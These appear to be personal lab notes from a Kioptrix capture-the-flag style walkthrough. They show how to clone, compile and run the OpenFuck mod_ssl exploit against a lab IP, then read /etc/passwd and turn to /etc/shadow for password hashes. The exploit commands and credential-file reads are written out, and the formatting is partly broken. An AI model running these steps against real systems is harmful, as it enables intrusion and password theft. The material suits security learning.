[Cloning the OpenFuckV2 vulnerabilities based on our findings](https://github.com/heltonWernik/OpenFuck.git)

**Continuation of previous exploit**
[[Gaining Root with Metasploit]] #Kioptrix 
# OpenLuck


Original is OpenFu*&%$#, I change for something more elegant

## [](https://github.com/heltonWernik/OpenLuck?tab=readme-ov-file#usage)Usage
This Exploit ([https://www.exploit-db.com/exploits/764/](https://www.exploit-db.com/exploits/764/)) is outdated. Here you can take updated

```
git clone https://github.com/heltonWernik/OpenFuck.git
```
2. Install ssl-dev library

```
apt-get install libssl-dev
```

3. It's Compile Time

```
gcc -o OpenFuck OpenFuck.c -lcrypto
```

4. Running the Exploit

```

**After identifying the server and version of the target we can attack it now with specific hexadecimal number based on the option from ./Open**
```
┌──(kali㉿kali)-[~/Desktop/kioptrix/OpenFuck]
└─$ ./Open 0x6b 192.168.189.130 -c 40
```

**Voila! We successfully exploited the Kioptrix using manual exploit**

**After we compromise the target the next thing is post exploitation. this part usually asking ourselves on how we can damage more in the server technically getting into target without doing anything is just nothing**

```
cat /etc/passwd
```
**root:x:0:0:root:/root:/bin/bash** so the **x** after the root is the placeholder of the password they linux decided to move it and encrypt it.

**So we gonna try other thing.** so we use the shadow instead of password because that's where the password located at.
